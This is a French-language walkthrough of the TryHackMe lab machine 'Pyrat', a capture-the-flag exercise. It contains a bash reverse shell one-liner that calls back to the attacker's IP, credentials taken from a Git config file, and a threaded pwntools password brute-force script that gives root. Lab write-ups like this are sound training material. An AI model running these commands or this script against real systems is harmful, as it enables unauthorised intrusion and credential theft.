📌 Write-Up : Machine Pyrat - TryHackMe 🏴‍☠️

## 📝 Informations générales
- **Nom de la machine** : Pyrat
- **Plateforme** : TryHackMe
- **Catégorie** : Web Exploitation / Privilege Escalation
- **Techniques utilisées** : Nmap, Telnet, Python Injection, Privilege Escalation via Git

---

## 🔍 1. Scan initial

On commence par un scan **Nmap** pour identifier les services ouverts :
```bash
sudo nmap -sS -O -Pn 10.10.56.203
```
📚 **Résultats :**
- **22/tcp**   : Open (SSH)
- **8000/tcp** : Open (HTTP-Alt)
- **OS** : Linux 4.15

---

## 🛡️ 2. Connexion Telnet & Exécution de code Python

Le site web sur **http://10.10.56.203:8000** affiche un message :
```
Try a more basic connection!
```

On tente une connexion **Telnet** sur le port **8000** :
```bash
telnet 10.10.56.203 8000
```
📚 **Résultats :** Un **interpréteur Python interactif** est actif.

### 🔎 Test d'injection Python
On vérifie si on peut exécuter du code :
```python
print("Hello, world!")
```
📚 **Résultat :** Le serveur répond "Hello, world!", confirmant qu'on peut exécuter du Python.

---

## 💀 3. Obtention d'un Reverse Shell

On injecte une commande pour obtenir un shell réversible avec **Netcat** :
```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.14.97.207/9001 0>&1'")
```
💡 **Sur Kali, on lance un listener Netcat :**
```bash
nc -lvnp 9001
```
📚 **Résultat :** Accès obtenu en tant que `www-data@Pyrat`.

---

## 🎓 4. Escalade de privilèges - Récupération des Credentials

On explore les fichiers sensibles :
```bash
cd /opt/dev/.git
ls -la
```
On trouve un fichier contenant des **identifiants GitHub** :
```bash
cat config
```
📚 **Résultat :**
- **Nom d’utilisateur** : `think`
- **Mot de passe** : `_TH1NKINGPirate$_`

### 🔑 Connexion SSH avec `think`
```bash
ssh think@10.10.56.203
```
On trouve **`user.txt`** dans le dossier home.
```bash
cat ~/user.txt
```
📚 **User flag récupéré !**

---

## 🛡️ 5. Escalade de privilèges - Root

### 🔍 Exploration Git : `pyrat.py.old`

On vérifie les anciens fichiers dans `.git` :
```bash
git ls-tree -r HEAD
```
📚 **Résultat :** Un fichier `pyrat.py.old` est trouvé.

On examine son contenu :
```bash
git show HEAD:pyrat.py.old
```
📚 **Extrait du code :**
```python
def switch_case(client_socket, data):
    if data == 'shell':
        shell(client_socket)

def shell(client_socket):
    import pty
    os.dup2(client_socket.fileno(), 0)
    os.dup2(client_socket.fileno(), 1)
    os.dup2(client_socket.fileno(), 2)
    pty.spawn("/bin/sh")
```
💡 **Hypothèse :** Si nous pouvons **envoyer `shell` à ce script**, nous pourrions obtenir un shell root.

---

## 🔓 6. Bruteforce du mot de passe root

### 🔎 Script de bruteforce du mot de passe

```python
#!/usr/bin/env python3
from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
stop_flag = threading.Event()
num_threads = 100

def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return

def main():
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```
📚 **Résultat :**
```bash
$ python3 brute_force_input.py
[+] Input found: admin
[+] Output received: b'Start a fresh client to begin.\n'
```

---

## 🏆 7. Obtention du flag root.txt

Une fois le mot de passe trouvé, on se connecte à **Telnet avec l'utilisateur `admin`** :
```bash
$ nc 10.10.98.190 8000
admin
Password: <mot de passe trouvé>
```
Ensuite, on transforme la connexion en shell en tapant :
```bash
shell
```
On récupère enfin le flag root :
```bash
cat root.txt
```
📚 **Flag root récupéré !** 🎉

---

✅ **Exploitation réussie !** 🚀🔥
